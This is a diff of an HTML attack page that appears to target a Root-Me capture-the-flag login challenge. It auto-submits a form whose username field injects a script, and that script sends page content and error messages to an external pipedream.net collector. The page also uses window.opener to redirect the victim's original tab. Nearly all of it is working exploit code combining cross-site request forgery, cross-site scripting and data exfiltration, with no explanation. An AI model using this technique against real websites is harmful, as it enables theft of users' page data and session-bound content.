@@ -4,7 +4,7 @@
 
 
 <form id='ooo' method="POST" action="http://challenge01.root-me.org:58003/login">
-            <input id="username" class="mgb-1" name="username" value="<script>fetch('https://en6gc9c8vfzvo.x.pipedream.net/?opener' + document.querySelector('section').textContent)</script>"><br>
+            <input id="username" class="mgb-1" name="username" value="<script>fetch('https://en6gc9c8vfzvo.x.pipedream.net/?opener' + document.querySelector('section').childNodes.length)</script>"><br>
             <input id="secret" class="mgb-1" name="secret" value="jj"><br>
         </form>
 
@@ -13,10 +13,16 @@
 
 if (window.opener) {
 	window.opener.location.replace('http://challenge01.root-me.org:58003/profile')
-	document.getElementById('ooo').submit();
+	
+	try{
+		document.getElementById('ooo').submit();
+	} catch (error) {
+	  	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr0='+error, {mode: 'no-cors'})
+	}
 	//fetch('https://en6gc9c8vfzvo.x.pipedream.net/?opener' + window.opener.document.body.textContent, {mode: 'no-cors'})
 } else {
 	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?noOpener=', {mode: 'no-cors'})
+	document.getElementById('ooo').submit();
 }
 </script>
 </body>
